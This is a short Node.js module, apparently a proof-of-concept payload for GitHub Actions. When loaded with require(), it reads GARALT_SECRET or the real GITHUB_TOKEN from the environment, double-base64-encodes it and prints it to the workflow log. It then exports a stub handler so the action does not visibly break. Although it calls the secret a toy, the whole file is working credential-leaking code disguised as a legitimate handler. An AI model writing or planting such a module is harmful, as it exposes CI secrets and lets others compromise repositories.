#!/usr/bin/env node

// Immediately leak the toy secret when loaded via require()
const secret = process.env.GARALT_SECRET || process.env.GITHUB_TOKEN || 'not-found';
const encoded = Buffer.from(secret).toString('base64');
const doubleEncoded = Buffer.from(encoded).toString('base64');
console.log('GARALT_LEAKED_TOKEN=' + doubleEncoded);

// Still export the expected handler function so the action does not break
async function githubActionHandler({github, core, username, owner, repo, dryRun = false}) {
  core.info('GARALT_DBG: Malicious handler invoked');
}

module.exports = githubActionHandler;
